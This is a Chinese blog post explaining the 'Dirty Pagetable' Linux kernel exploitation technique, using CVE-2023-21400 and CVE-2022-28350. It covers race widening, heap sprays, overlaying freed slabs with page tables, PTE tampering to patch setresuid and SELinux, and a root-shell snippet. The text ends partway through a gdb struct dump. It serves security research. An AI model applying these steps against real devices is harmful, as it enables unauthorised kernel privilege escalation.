---
layout: post
title: Dirty Pagetable-一种新的内核漏洞利用技术
categories: Kernel-exploit
description: 利用堆漏洞（UAF/Double-Free/OOB）篡改末级页表中的PTE条目，实现任意物理地址读写。
keywords: CVE, Kernel, Exploit
---



本文来自 [Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) 。

**总结**：Dirty Pagetable —— 利用堆漏洞（UAF/Double-Free/OOB）篡改末级页表中的PTE条目，实现任意物理地址读写。本文以 CVE-2023-21400 （io_uring中`io_defer_entry`对象的UAF）、CVE-2022-28350（`file` UAF）、CVE-2020-29661（`pid` UAF）为例，介绍利用方法。步骤如下：

- （1）触发UAF释放漏洞对象，并将漏洞对象所在的slab（受害者slab）还给页分配器；
- （2）分配末级用户页表来占用受害者slab（从页分配器直接分配，1 page，有512个PTE）；
- （3）利用漏洞构造原语来修改PTE，例如Double-Free（利用victim对象，`signalfd_ctx->sigmask` 存在有限制的8字节写操作，还能读出来）、UAF（利用漏洞对象`file`，调用`dup()`会递增`file->f_count`）；
- （4）将PTE改为指向内核text/data的物理地址，patch某些系统调用（例如`setresuid()` / `setresgid()`），注意需要刷新TLB；注意，需要定位该PTE对应的用户虚拟地址（从虚拟地址读，如果不等于初始化的值，则说明PTE被篡改了，可以初始化为特定值或者对应的虚拟地址），这样才能通过写入该虚拟地址来patch内核物理地址。
- （5）调用`setresuid()` / `setresgid()`提权。
  对于`file` UAF和`pid` UAF，由于只能采用递增原语来篡改PTE（不能任意篡改PTE），且mmap()分配的内存对应的物理地址大于内核text/data的物理地址，无法随意篡改内核text/data。解决办法是使PTE指向某个用户页表，通过间接篡改用户页表，来篡改物理内存。
  问题2，普通mmap()分配的物理页和页表页位于不同的物理内存，所以很难通过递增PTE使之指向另一用户页表。解决2，通过dma-buf heaps, io_uring, GPUs可以分配共享页，和用户页表位于同种内存，可以构造PTE指向共享页，利用递增原语使该PTE指向另一共享页，再通过共享页来篡改用户页表。

**脏页表简介**：Dirty Pagetalbe 是利用堆漏洞来操纵用户页表，实现任意物理地址读写。属于基于数据流的利用技术，可绕过CFI、KASLR、SMAP/PAN等。作者利用CVE-2023-21400漏洞在Google Pixel 7上实现了提权，并且，针对两种常见的漏洞开发了exploit：file UAF和pid UAF。

## 1. 脏页表原理

脏页表可用于UAF/Double-Free/OOB漏洞，本文以UAF为例来介绍如何使用Dirty Pagetable方法。

**（1）步骤1. 触发UAF并将victim slab返还给页分配器**

**方法**：将UAF漏洞对象所在的slab成为 victim slab。触发UAF释放漏洞对象，并继续释放victim slab 中所有其他对象，会将victim slab返还给页分配器。

**（2）步骤2. 用用户页表占用victim slab**

**方法**：用户页表是直接用页分配器分配的，可分配用户页表来占用victim slab，注意，使用最后一级页表。成功占用后如下图所示：

![pic1_occupy_with_pagetable](/images/posts/Dirty-Pagetable/pic1_occupy_with_pagetable.svg)

注意，这里把漏洞对象称为了 victim object。

**（3）构造页表条目（PTE）**

**方法**：利用漏洞对象构造适当的原语来修改PTE。本文就是将CVE-2023-21400 Double-Free漏洞转化为篡改PTE的原语的，后面会介绍将file UAF / pid UAF转化为increment原语来伪造PTE。现在假设已经有一个写原语来篡改页表中的PTE。

**（4）修改PTE来patch内核**

**方法**：将PTE的物理地址设置为内核text/data的物理地址，就能patch内核了。为了实现提权，可以patch某些系统调用，例如`setresuid()` / `setresgid()`，这样非特权用户也能调用。可能还需要patch和SELinux相关的变量来禁用SELinux（手机中需要patch）。

**（5）提权**

**方法**：由于已经patch了`setresuid()` / `setresgid()`，可直接执行以下代码提权

```c
if (setresuid(0, 0, 0) < 0) {
    perror("setresuid");
} else {
    if (setresgid(0, 0, 0) < 0) {
        perror("setresgid");
    } else {
        printf("[+] Spawn a root shell\n");
        system("/system/bin/sh");
    }
}
```

以上5个步骤展示了脏页表利用的简单过程。下节将介绍如何针对具体的漏洞，来利用脏页表来提权。

## 2. 利用CVE-2023-21400 Double-Free漏洞

CVE-2023-21400是`io_uring`中的Double-Free漏洞，影响内核5.10，作者和张晔（[@VAR10CK](https://twitter.com/VAR10CK)）在Google Pixel 7利用脏页表成功提权。

### 2-1. 漏洞分析

在`io_uring`中，当我们提交`IOSQE_IO_DRAIN`请求时，在之前提交的请求完成前，不会启动该请求。因此，推迟处理该请求，将该请求添加到`io_ring_ctx->defer_list`双链表中（[io_defer_entry](https://elixir.bootlin.com/linux/v5.10.100/source/fs/io_uring.c#L707) 对象）：

![pic2_defer_list](/images/posts/Dirty-Pagetable/pic2_defer_list.svg)

**竞争访问1-漏洞对象取出**：之前提交的请求完成以后，就会**将推迟的请求（`io_defer_entry`对象）从`defer_list`中删除**。由于可以并发访问`defer_list`，所以访问`defer_list`时必须加上自旋锁。但是，有一种情况是在没有`completion_lock` spinlock保护的情况下访问的`defer_list`。在`io_uring`中启用了`IORING_SETUP_IOPOLL`时，可以通过调用 `io_uring_enter(IORING_ENTER_GETEVENTS)`来获取事件完成情况，所触发的调用链为 `io_uring_enter()->io_iopoll_check()->io_iopoll_getevents()->io_do_iopoll()->io_iopoll_complete()->io_commit_cqring()->__io_queue_deferred()`。

```c
// __io_queue_deferred() —— 从`ctx->defer_list`取出延迟的请求
static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list, // 从`ctx->defer_list`获取`io_defer_entry`对象
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq))
            break;
        list_del_init(&de->list);
        io_req_task_queue(de->req); 	// 对应的请求将排队等候 task_work_run()
        kfree(de);
    } while (!list_empty(&ctx->defer_list));
}
```

**竞争访问2**：以上函数访问`ctx->defer_list`时没有获取`ctx->completion_lock`锁，可能导致竞争条件漏洞。因为除了`__io_queue_deferred()`函数，`io_cancel_defer_files()`函数也可以处理`ctx->defer_list`：

`io_cancel_defer_files()`函数有两条触发路径：

- `do_exit()->io_uring_files_cancel()->__io_uring_files_cancel()->io_uring_cancel_task_requests()->io_cancel_defer_files()`
- `execve()->do_execve()->do_execveat_common()->bprm_execve()->io_uring_task_cancel()->__io_uring_task_cancel()->__io_uring_files_cancel()->io_uring_cancel_task_requests()->io_cancel_defer_files()` —— 这种方式不需要退出当前任务，因此更加可控。可选择这种方式来触发。

```c
static void io_cancel_defer_files(struct io_ring_ctx *ctx,
                  struct task_struct *task,
                  struct files_struct *files)
{
    struct io_defer_entry *de = NULL;
    LIST_HEAD(list);
    spin_lock_irq(&ctx->completion_lock);
    list_for_each_entry_reverse(de, &ctx->defer_list, list) {
        if (io_match_task(de->req, task, files)) {
            list_cut_position(&list, &ctx->defer_list, &de->list);
            break;
        }
    }
    spin_unlock_irq(&ctx->completion_lock);
    while (!list_empty(&list)) {
        de = list_first_entry(&list, struct io_defer_entry, list);
        list_del_init(&de->list);
        req_set_fail_links(de->req);
        io_put_req(de->req);
        io_req_complete(de->req, -ECANCELED);
        kfree(de);
    }
}
```

**构造竞争**：通过以下代码来构造竞争，同时处理`ctx->defer_list`。

```c
iopoll Task                                                exec Task
(cpu A)                                                     (cpu B)

A1.create a `io_ring_ctx` with
IORING_SETUP_IOPOLL enabled by io_uring_setup();

A2.生成`io_defer_entry`对象, 将其添加到`ctx->defer_list`

A3.触发 __io_queue_deferred();            <-------->        B1.触发 io_cancel_defer_files();
```

**改进条件竞争**：竞争条件一般会触发内存损坏。对于本例会复杂一点，通常，`io_cancel_defer_files()`只处理当前任务创建的`io_ring_ctx`的延迟列表`defer_list`。因此，exec 任务中的`io_cancel_defer_files()`不会处理 iopoll 任务中相同的延迟列表。有一个例外，如果我们在exec任务中向 iopoll 任务的`io_ring_ctx` 提交`IOSQE_IO_DRAIN`请求时，就可以让exec任务进程中的`io_cancel_defer_files()`处理该`io_ring_ctx`的延迟队列。新的条件竞争如下：

```c
iopoll Task                                            exec Task
(cpu A)                                                (cpu B)

A1.通过io_uring_setup()创建一个`io_ring_ctx`;

A2.生成`io_defer_entry`对象, 将其添加到`ctx->defer_list`
                                                       B1.向`io_ring_ctx`提交`IOSQE_IO_DRAIN`请求
                                                        (这会生成另一个`io_defer_entry`，并添加到
                                                         `ctx->defer_list`)


A3.触发 __io_queue_deferred();       <-------->        B2.触发 io_cancel_defer_files();
```

在这种情况下，当exec任务和iopoll任务同时处理`defer_list`时，会触发内存损坏。

### 2-2. 触发漏洞

由于竞争无法控制`io_cancel_defer_files()` 和 `__io_queue_deferred()` 何时被触发，可通过重复执行exec任务和iopoll任务，如下所示：

```c
iopoll Task                                            exec Task
(cpu A)                                                (cpu B)
while(1) { //<----- 重复                                while(1) { //<----- 重复
  A1.通过io_uring_setup()创建一个`io_ring_ctx`;

  A2.生成`io_defer_entry`对象, 将其添加到`ctx->defer_list`
                                                         B1.向`io_ring_ctx`提交`IOSQE_IO_DRAIN`请求
                                                         (这会生成另一个`io_defer_entry`，并添加到
                                                         `ctx->defer_list`)


  A3.触发 __io_queue_deferred();       <-------->         B2.触发 io_cancel_defer_files();
}                                                      }
```

**两种崩溃情况**：

- （1）由无效list造成。`io_cancel_defer_files()` 和 `__io_queue_deferred()` 会竞争遍历`ctx->defer_list`并从中移除对象，因此`ctx->defer_list`可能会无效，会触发`__list_del_entry_valid()`导致内核崩溃。这种情况无法利用。
- （2）由Double-Free造成。情况如下：

```c
iopoll Task                                          exec Task
(cpu A)                                              (cpu B)

static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list,
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq))
            break;

                                        static void io_cancel_defer_files(struct io_ring_ctx *ctx,
                                                          struct task_struct *task,
                                                          struct files_struct *files)
                                        {
                                            struct io_defer_entry *de = NULL;
                                            LIST_HEAD(list);
                                            spin_lock_irq(&ctx->completion_lock);
                                            list_for_each_entry_reverse(de, &ctx->defer_list, list) {
                                                if (io_match_task(de->req, task, files)) {
                                                    list_cut_position(&list, &ctx->defer_list, &de->list);
                                                    break;
                                                }
                                            }
                                            spin_unlock_irq(&ctx->completion_lock);
                                            while (!list_empty(&list)) {
                                                de = list_first_entry(&list, struct io_defer_entry, list);
                                                list_del_init(&de->list);

        list_del_init(&de->list);
        io_req_task_queue(de->req);
        kfree(de);  //<-----  the first kfree()
    } while (!list_empty(&ctx->defer_list));
}

                                                req_set_fail_links(de->req);
                                                io_put_req(de->req);
                                                io_req_complete(de->req, -ECANCELED);
                                                kfree(de);  //<----- the second kfree()
                                            }
                                        }
```

### 2-3. 尝试

Android内核5.10中，`io_defer_entry`漏洞对象位于`kmalloc-128`，触发Double-Free的步骤如下：

（1）在第1次 `kfree()` 之前：

![pic3_before_kfree](/images/posts/Dirty-Pagetable/pic3_before_kfree.svg)

（2）在第1次 `kfree()` 之后：

![pic4_first_kfree](/images/posts/Dirty-Pagetable/pic4_first_kfree.svg)

（3）第2次 `kfree()` 之后：

![pic5_second_kfree](/images/posts/Dirty-Pagetable/pic5_second_kfree.svg)

（4）如上所示，slab进入了非法状态：`freelist`和`next object`都指向同一空闲对象。理想情况下，我们可以从slab中分配对象两次，从而控制slab的freelist。首先，从slab中分配出一个内容可控的对象：

![pic6_after_allocate](/images/posts/Dirty-Pagetable/pic6_after_allocate.svg)

（5）可见，由于分配的对象内容可控，可以让`next object`指向我们可控的任何虚拟地址。接着，再次从slab中分配一个对象，slab如下所示：

![pic7_after_second_allocate](/images/posts/Dirty-Pagetable/pic7_after_second_allocate.svg)

让freelist指向我们可控的虚拟地址，就能轻松提权。问题是Android内核开启了`CONFIG_SLAB_FREELIST_HARDENED`，会混淆`next object`指针，由于freelist不可控而导致内核崩溃。

### 2-4. 可利用性

**目标**：将Double-Free转化为UAF。

```c
iopoll  Task                                        exec Task
(cpu A)                                             (cpu B)

A1.kfree(de);

A2.堆喷，分配受害者对象来占据de

                                                    B1. kfree(de); // 再次释放受害者对象

                                                    B2. 使用受害者对象就会触发UAF
```

**（1）挑战 1 - 竞争窗口过小：难以在两次释放`io_defer_entry`之间堆喷占用空闲对象**

**（2）挑战 2 - 重复触发Double-Free会降低可利用性**

重复速度越快，Double-Free错误触发的速度越快。在测试时，可通过添加调试代码来增大两次`kfree()`之间的时间窗口，解决挑战1：

```c
iopoll  Task                                        exec Task
(cpu A)                                             (cpu B)

A1.kfree(de);

A2.堆喷，分配受害者对象来占据de

                                                    B1.mdelay(200) // 增大竞争窗口 !!!

                                                    B2.kfree(de);  // 释放受害者对象

                                                    B3. 使用受害者对象就会触发UAF
```

问题是，增大了竞争窗口，能够解决挑战1，但是使得重复速度变慢，很难触发Double-Free漏洞了。增大竞争窗口和提高重复速率相矛盾了。

**（3）解决挑战 2 - 通过增大`ctx->defer_list`双链表的长度，增大iopoll任务的遍历时间，以控制竞争点的时序**

首先，作者发现`ctx->defer_list`可以是很长的list，因为`io_uring`不限制`ctx->defer_list`中`io_defer_entry`对象的个数。其次，生成`io_defer_entry`对象很容易。根据 io_uring 稳定，我们不仅可以生成`io_defer_entry`对象与启用REQ_F_IO_DRAIN的请求相关联，还可以生成`io_defer_entry`对象与未启用REQ_F_IO_DRAIN的请求相关联。

```c
       IOSQE_IO_DRAIN
              When this flag is  specified,  the  SQE  will  not  be  started  before  previously
              submitted  SQEs  have  completed,  and new SQEs will not be started before this one
              completes. Available since 5.2.
           当指定此标志时，SQE将不会在之前提交的SQE完成之前开始处理，新的SQE也不会在这个SQE完成之前开始。5.2开始可用
```

以下代码用于生成100w个`io_defer_entry`对象，每个对象都与一个未启用 REQ_F_IO_DRAIN 的请求相关联：

```c
iopoll  Task
(cpu A)

A1. create a `io_ring_ctx` with IORING_SETUP_IOPOLL enabled by io_uring_setup();

A2: 提交 IORING_OP_READ 请求来读取 ext4 文件系统的文件;

A3. 在启用 REQ_F_IO_DRAIN 的情况下提交请求;  // 触发生成`io_defer_entry`对象，因为还没有获取到之前的请求的CQE 

A4. for (i = 0; i < 1000000; i++) {
        在禁用 REQ_F_IO_DRAIN 的情况下提交请求;  // 触发生成`io_defer_entry`对象，和未启用REQ_F_IO_DRAIN的请求相关联
    }
```

由于我们能够生成非常多的`io_defer_entry`，且与未启用REQ_F_IO_DRAIN的请求相关联，因此可以**使 `__io_queue_deferred()` 遍历`ctx->defer_list`很长一段时间**。这样能**使`__io_queue_deferred()`执行数秒钟，然后同时准确的触发执行`io_cancel_defer_files()`，准确触发Double-Free**。

```c
static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list,
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq)) // 返回false，因为没有启用REQ_F_IO_DRAIN
            break;
        list_del_init(&de->list);
        io_req_task_queue(de->req);
        kfree(de);
    } while (!list_empty(&ctx->defer_list));
}
```

**（4）解决挑战 1 - 利用两次`kfree()`之间的代码来增大竞争窗口**

现在不需要使用重复策略来触发Double-Free了，可以任意扩大 `kfree()`时间窗。很可惜Jann Horn[1]、Yoochan Lee、Byoungyoung Lee、Chanwoo Min[2]提出的方法都没用。那么 `io_cancel_defer_files()` 中是否有些代码可以帮助增大时间窗口呢？

作者发现，`io_cancel_defer_files()`第2次调用`kfree()`之前有很多唤醒操作，例如，会调用 `io_req_complete()` -> `io_cqring_ev_posted()`。

```c
static void io_cqring_ev_posted(struct io_ring_ctx *ctx)
{
    if (wq_has_sleeper(&ctx->cq_wait)) {
        wake_up_interruptible(&ctx->cq_wait);  //<------------------------ wakeup the waiter (1)
        kill_fasync(&ctx->cq_fasync, SIGIO, POLL_IN);
    }
    if (waitqueue_active(&ctx->wait))
        wake_up(&ctx->wait);                   //<------------------------ wakeup the waiter (2)
    if (ctx->sq_data && waitqueue_active(&ctx->sq_data->wait))
        wake_up(&ctx->sq_data->wait);          //<------------------------ wakeup the waiter (3)
    if (io_should_trigger_evfd(ctx))
        eventfd_signal(ctx->cq_ev_fd, 1);      //<------------------------ wakeup the waiter (4)
}
```

exec任务有4个地方会唤醒其他任务来运行，可利用第1个来扩大时间窗口。**对 io_uring fd调用`epoll_wait()`，就能在`ctx->cq_wait`上设置一个waiter；还需要另一个epoll任务来执行`epoll_wait()`，这样epoll任务就能在调用`wake_up_interruptible()`时抢占CPU，从而在第2次调用`kfree()`之前暂停 `io_cancel_defer_files()`**。问题是，如果很快就重新执行exec任务，时间窗还是很小。解决办法是采用 Jann Horn[1] 提到的调度器策略，成功将 `kfree()` 窗口增大数秒。

触发Double-Free并转化为UAF的流程如下：

![pic8_final_race](/images/posts/Dirty-Pagetable/pic8_final_race.svg)

### 2-5. 提权

#### 2-5-1. 创建`signalfd_ctx`受害者对象

**`signalfd_ctx`分配**：调用`signalfd()`就会从 kmalloc-128 分配`signalfd_ctx`对象。

```c
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
    struct signalfd_ctx *ctx;
    ......
    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));// mask 值的 bit 18 和 bit 8 会被置为 1
    signotset(mask);

    if (ufd == -1) {
        ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);      //<-----------  分配`signalfd_ctx`对象
        if (!ctx)
            return -ENOMEM;

        ctx->sigmask = *mask;

        /*
         * When we call this, the initialization must be complete, since
         * anon_inode_getfd() will install the fd.
         */
        ufd = anon_inode_getfd("[signalfd]", &signalfd_fops, ctx,
                       O_RDWR | (flags & (O_CLOEXEC | O_NONBLOCK)));
        if (ufd < 0)
            kfree(ctx);
    } else {
        struct fd f = fdget(ufd);
        if (!f.file)
            return -EBADF;
        ctx = f.file->private_data;
        if (f.file->f_op != &signalfd_fops) {
            fdput(f);
            return -EINVAL;
        }
        spin_lock_irq(&current->sighand->siglock);
        ctx->sigmask = *mask;                       // <----  对 signalfd_ctx->sigmask 进行有限制的写操作
        spin_unlock_irq(&current->sighand->siglock);

        wake_up(&current->sighand->signalfd_wqh);
        fdput(f);
    }

    return ufd;
}
```

**`signalfd_ctx`读写操作**：如上所示，在堆喷后会往`signalfd_ctx`开头写入8字节，但不影响利用。除了有限制的写操作，还可以通过`show_fdinfo`接口（procfs导出）读取`signalfd_ctx`的前8字节。

```c
static void signalfd_show_fdinfo(struct seq_file *m, struct file *f)
{
    struct signalfd_ctx *ctx = f->private_data;
    sigset_t sigmask;

    sigmask = ctx->sigmask;
    signotset(&sigmask);
    render_sigset_t(m, "sigmask:\t", &sigmask); 	// 读取`signalfd_ctx`的前8字节
}
```

**堆喷`signalfd_ctx`**：在两次`kfree()`之间，堆喷16000 `signalfd_ctx` 对象来占用释放的`io_defer_entry`对象。如果成功占据，那么第2次`kfree()`就会释放这个`signalfd_ctx` 对象，我们将其称为受害者`signalfd_ctx` 对象。

#### 2-5-2. 定位受害者`signalfd_ctx` 对象

**思路**：堆喷`seq_operations`对象是为了确定哪一个`signalfd_ctx` 对象被释放了，也即受害者`signalfd_ctx` 对象对应的fd，便于后面利用该fd篡改PTE。

第2次`kfree()`后堆喷16000个`seq_operations`对象，可调用`single_open()`来分配（打开`/proc/self/status`或其他procfs文件可触发`single_open()`）。

```c
int single_open(struct file *file, int (*show)(struct seq_file *, void *),
        void *data)
{
    struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);//allocate seq_operations object
    int res = -ENOMEM;

    if (op) {
        op->start = single_start;
        op->next = single_next;
        op->stop = single_stop;
        op->show = show;
        res = seq_open(file, op);
        if (!res)
            ((struct seq_file *)file->private_data)->private = data;
        else
            kfree(op);
    }
    return res;
}
```

如果堆喷的`seq_operations`对象占据了某个释放的`signalfd_ctx`对象，如下所示：

![pic9_locate_signalfd_ctx](/images/posts/Dirty-Pagetable/pic9_locate_signalfd_ctx.svg)

**方法**：通过读取所有信号fd的fdinfo，如果其fdinfo与初始化不同，说明其前8字节被覆盖成了`seq_operations`的内核地址。该fd和受害者`signalfd_ctx`对象相关联。这样就定位到了受害者`signalfd_ctx` 对象

#### 2-5-3. 回收受害者`signalfd_ctx` 对象所在的slab

**方法**：关闭所有信号fd和`/proc/self/status` fd，除了受害者`signalfd_ctx` 对象对应的fd，这样受害者`signalfd_ctx`对象所在的slab变空，会被页分配器所回收。

#### 2-5-4. 用户页表占据受害者slab

**目标**：堆喷用户页表来占据受害者slab，并定位受害者`signalfd_ctx`对象的位置。

由于kmalloc-128 slab使用的是1-page，且用户页表也是1-page，这样可以堆喷用户页表来占据受害者slab。如果成功则如下图所示：

![pic10_pagetable_occupy](/images/posts/Dirty-Pagetable/pic10_pagetable_occupy.svg)

可见，**通过写入受害者`signalfd_ctx`对象的前8字节，可以控制用户页表的某个PTE。将PTE的物理地址设置为内核text/data的物理地址，就能修改内核text/data数据。**

页表喷射步骤如下：

**（1）调用`mmap()`在虚拟地址空间中创建一块大内存区域**

**内存区域大小**：因为每个末级页表描述了2M的虚拟内存（`512*4096`），所以如果要喷射512个用户页表，必须调用 `mmap()` 创建512*2M大小的内存区域。

内存区域计算 —— `内存区域大小 = 页表数量 * 2MiB`

**起始虚拟地址**：起始虚拟地址需与2M（0x200000）对齐。原因是，现在我们只能控制`signalfd_ctx`的前8字节，并且不知道受害者`signalfd_ctx`对象在slab中具体位置，可能位于中间。0x200000对齐的起始虚拟地址能确保**该地址对应的PTE位于页表的前8个字节**。这样在第3步之后页表将如下所示：

![pic11_start_virtual_address](/images/posts/Dirty-Pagetable/pic11_start_virtual_address.svg)

**（2）页表分配**

**分配方法**：上一步已经创建了内存区域，现在可以从起始虚拟地址开始每隔0x200000字节执行一次写操作，确保内存区域对应的所有用户页表都被分配。即可堆喷用户页表。

```c
unsigned char *addr = (unsigned char *)start_virtual_address;
for (unsigned int i = 0; i < size_of_memory_region; i+= 0x200000) {
    *(addr + i) = 0xaa;
}
```

**（3）在页表中定位受害者`signalfd_ctx`对象**

在第2步以后，我们只能确保每个页表的第1个PTE有效。因为受害者`signalfd_ctx`对象可以位于页表中与 128 对齐的任何偏移处，所以必须验证位于页表中所有与128对齐的偏移处的PTE。因此，我们从起始虚拟地址开始，每隔16K字节（每个page含有32个`signalfd_ctx`对象，对象大小为128字节，`128 / 8 * 4096 = 16 page`，这里的16K小了，但也能达到目的）进行一次写操作。最终的页表如上图所示。

**定位方法**：通过读取受害者信号fd的fdinfo，可以泄露受害者`signalfd_ctx`对象的前8个字节。**如果能成功读取一个有效的PTE值，说明成功的用用户页表占用了受害者slab**。否则，unmap() 该区域，重映射更大的内存，重复步骤（1）~（3）。

#### 2-5-5. patch内核并提权

现在可通过受害者`signalfd_ctx`对象控制PTE，下面通过将PTE的物理地址设置为内核text/data地址，patch内核并提权。

**（1）定位PTE对应的用户虚拟地址**

**目的**：虽然现在可以控制用户页表的一个PTE，但是还不知道该PTE对应的用户虚拟地址。只有知道了该PTE对应的虚拟地址，才能**通过写入该用户虚拟地址来patch内核的text/data**。

**方法**：为了定位该PTE对应的用户虚拟地址，需将该PTE的物理地址修改为其他物理地址。然后遍历之前映射的所有虚拟地址，检查是否有一个虚拟地址上的值不是之前设置的初始值（0xaa）。如果找到这样一个虚拟地址，则说明就是PTE对应的虚拟地址。

![pic12_find_virtual_address](/images/posts/Dirty-Pagetable/pic12_find_virtual_address.svg)

**（2）绕过写限制**

**写限制**：受害者`signalfd_ctx`对象的写入能力有限（写入值的bit 18和bit 8被设置为1），无法对内核任意地址进行patch。一个普通PTE对应的用户虚拟地址为`0xe800098952ff43`，其bit 8总是为1，但是bit 18位于PTE的物理地址中，所以只能对bit 18为1的物理地址进行patch。

该限制是由`do_signalfd4()`中的`sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));`语句所导致，是否可以对该语句打patch呢？

```c
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
    struct signalfd_ctx *ctx;
    ......
    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP)); // 将mask中的bit 18和bit 8设置为1
    signotset(mask);

    if (ufd == -1) {
        ......
    } else {
        struct fd f = fdget(ufd);
        if (!f.file)
            return -EBADF;
        ctx = f.file->private_data;
        if (f.file->f_op != &signalfd_fops) {
            fdput(f);
            return -EINVAL;
        }
        spin_lock_irq(&current->sighand->siglock);
        ctx->sigmask = *mask;                       // <----- 对signalfd_ctx进行有限制的写操作 
        spin_unlock_irq(&current->sighand->siglock);

        wake_up(&current->sighand->signalfd_wqh);
        fdput(f);
    }

    return ufd;
}
```

`do_signalfd4()`的物理地址的 bit 18 恰好为1，因此可patch `sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));` 语句。如何找到内核某函数的物理地址？

**（3）对内核打补丁**

目标是对`selinux_state`和`setresuid()`/`setresgid()`等函数打补丁，以提权 Google Pixel 7。由于只有一个PTE可控，所以需要多次修改PTE的物理地址。

**（4）调用`setresuid()`、`setresgid()`提权**

```c
if (setresuid(0, 0, 0) < 0) {
    perror("setresuid");
} else {
    if (setresgid(0, 0, 0) < 0) {
        perror("setresgid");
    } else {
        printf("[+] Spawn a root shell\n");
        system("/system/bin/sh");
    }
}
```

最终在Google Pixel 7上成功提权：

![pic13_pixel7_root](/images/posts/Dirty-Pagetable/pic13_pixel7_root.png)

### 2-6. 反思

脏页表利用非常强，特别是对Double-Free漏洞。本文只介绍了CVE-2023-21400的提权利用，对于CVE-2021-22600[3]和CVE-2022-22265[4]，是否也可以呢？

## 3. 利用file UAF

### 3-1. file UAF现有利用方法

file UAF漏洞最近比较流行，主要有3种利用方法：

- （1）获取已释放的受害者`file`对象，供新打开的特权文件重用，例如`/etc/crontab`，之后就能写入特权文件提权。Jann Horn[1]、Mathias Krause[5]、Zhenpeng Lin[6]和作者[7]用到了本方法。缺点有3个，一是在新内核上必须赢得竞争，有一定技巧性和概率性；二是Android上无法写入高权限文件，因为这些文件位于只读文件系统中；三是无法逃逸容器。
- （2）攻击系统库或可执行文件的页缓存， Xingyu Jin、Christian Resell、Clement Lecigne、Richard Neal[8] 和 Mathias Krause[9]用到了本方法。利用该方法可向libc.so等系统库中注入恶意代码，当特权进程执行libc.so时将以特权用户的身份执行恶意代码，利用结果类似于DirtyPipe。优点是不需要竞争，稳定性较好，但是要想在Android上完整提权或逃逸容器还很复杂，且不适用于其他类型的UAF漏洞。
- （3）Cross-cache利用。Yong Wang[10]和Maddie Stone[11]都用到了本方法。提权之前都需要绕过KASLR，Yong Wang[10] 通过重复使用syscall代码来猜测 kslides 绕过了KASLR，Maddie Stone[11] 通过另一个信息泄露漏洞绕过了KASLR。绕过KASLR之后，他们伪造了一个`file`对象来构造内核读写原语。缺点是需要绕过KASLR。

### 3-2. 脏页表方法利用file UAF

以CVE-2022-28350和内核版本为5.10的Android为例，介绍Dirty Pagetable的工作原理。

#### 3-2-1. CVE-2022-28350漏洞介绍

**介绍**：位于ARM Mali GPU驱动中的 file UAF 漏洞，影响Android 12 和 Android 13。漏洞原因如下。

```c
static int kbase_kcpu_fence_signal_prepare(...) {
    ...
    /* create a sync_file fd representing the fence */
    sync_file = sync_file_create(fence_out); //<------ 创建 file 对象
    if (!sync_file) {
        ...
        ret = -ENOMEM;
        goto file_create_fail;
    }

    fd = get_unused_fd_flags(O_CLOEXEC); //<------ 获取未使用的 fd
    if (fd < 0) {
        ret = fd;
        goto fd_flags_fail;
    }

    fd_install(fd, sync_file->file); //<------ 将 file 对象和 fd 关联起来

    fence.basep.fd = fd;
    ...
    if (copy_to_user(u64_to_user_ptr(fence_info->fence), &fence,
            sizeof(fence))) {
        ret = -EFAULT;
        goto fd_flags_fail; //<------ 进入本分支
    }

    return 0;

fd_flags_fail:
    fput(sync_file->file); //<------ 释放 file 对象
file_create_fail:
    dma_fence_put(fence_out);

    return ret;
}
```

可见，调用 `fd_install()` 将 `file` 对象与 fd 关联起来。通过`copy_to_user()`将fd传递到用户空间，但如果拷贝失败，将释放 `file` 对象，导致一个有效的fd和已释放的`file`对象关联起来：

![pic14_dangling_file](/images/posts/Dirty-Pagetable/pic14_dangling_file.svg)

上图可见，受害者fd与`filp` slab上已释放的file对象相关联，详情可参见 `[7]`。释放的file对象就称为受害者file对象，其所在的slab就是受害者slab。

#### 3-2-2. 回收受害者slab

释放受害者slab上所有对象后，页分配器会回收该slab。

#### 3-2-3. 用户页表占据受害者slab

Android上 `filp` slab的大小是2-page，而用户页表大小是1-page。虽然二者大小不同，但是堆喷用户页表来占用受害者slab的成功率几乎是100%，占用成功后内存布局如下：

![pic15_occupy_slab_with_pagetable](/images/posts/Dirty-Pagetable/pic15_occupy_slab_with_pagetable.svg)

#### 3-2-4. 递增原语+定位受害者PTE对应的虚拟用户地址

**递增原语**：目的是构造写原语来篡改PTE。受害者file对象被用户页表所覆写，对该file对象进行操作可能导致内核崩溃。但是作者发现，**调用 `dup()` 将file对象的`f_count`递增1**，不会触发崩溃，问题是 `dup()` 会消耗fd资源，单个进程最多打开32768个fd，所以`f_count`最多递增32768。作者又发现`fork()+dup()`可突破该限制，先调用`fork()`，会将受害者file对象的`f_count`加1，子进程中可将`f_count`增加32768。由于可以多次重复`fork()+dup()`，所以成功突破限制。

**PTE与`f_count`重叠**：下一步是让受害者PTE的位置与`f_count`重合，这样就能利用递增原语来控制PTE。

file对象的对齐大小为320字节，`f_count`的偏移是56，占8字节

```c
(gdb) ptype /o struct file
/* offset      |    size */  type = struct file {
/*      0      |      16 */    union {
/*                     8 */        struct llist_node {
/*      0      |       8 */            struct llist_node *next;

                                       /* total size (bytes):    8 */
                                   } fu_llist;
/*                    16 */        struct callback_head {
/*      0      |       8 */            struct callback_head *next;
/*      8      |       8 */            void (*func)(struct callback_head *);

                                       /* total size (bytes):   16 */
                                   } fu_rcuhead;

                                   /* total size (bytes):   16 */
                               } f_u;
/*     16      |      16 */    struct path {
/*     16      |       8 */        struct vfsmount *mnt;
